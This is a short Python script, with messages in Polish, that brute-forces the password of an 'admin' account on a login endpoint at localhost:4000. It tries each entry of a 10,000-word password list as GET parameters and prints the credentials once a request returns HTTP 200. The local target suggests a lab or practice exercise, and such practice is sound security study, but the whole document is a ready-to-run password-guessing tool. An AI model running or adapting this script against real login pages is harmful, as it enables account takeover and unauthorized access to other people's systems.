import requests
import time

TARGET_URL = "http://localhost:4000/users"
USERNAME = 'admin'
WORDLIST_FILE = 'Pwdb_top-10000.txt'

def brute_force():
    print("Start - Łamanie hasła")

    try:
        with open(WORDLIST_FILE, 'r', encoding='utf-8') as wordlist:
            for word in wordlist:
                password = word.strip()
                
                if not password:
                    continue
                
                params = {
                    "login" : USERNAME,
                    "pass" : password
                }

                print(f"Próba logowania z hasłem: {password}")

                try:
                    response = requests.get(TARGET_URL, params=params)

                    if response.status_code == 200:
                        print("Złamano hasło!")
                        print(f"Login: {USERNAME}")
                        print(f"Hasło: {password}")

                        return
                    
                except requests.exceptions.RequestException as e:
                    print(f"Błąd podczas próby logowania: {e}")
                    return
                
                time.sleep(0.01)

    except FileNotFoundError:
        print(f"Plik '{WORDLIST_FILE}' nie został znaleziony.")
        return

if __name__ == '__main__':
    brute_force()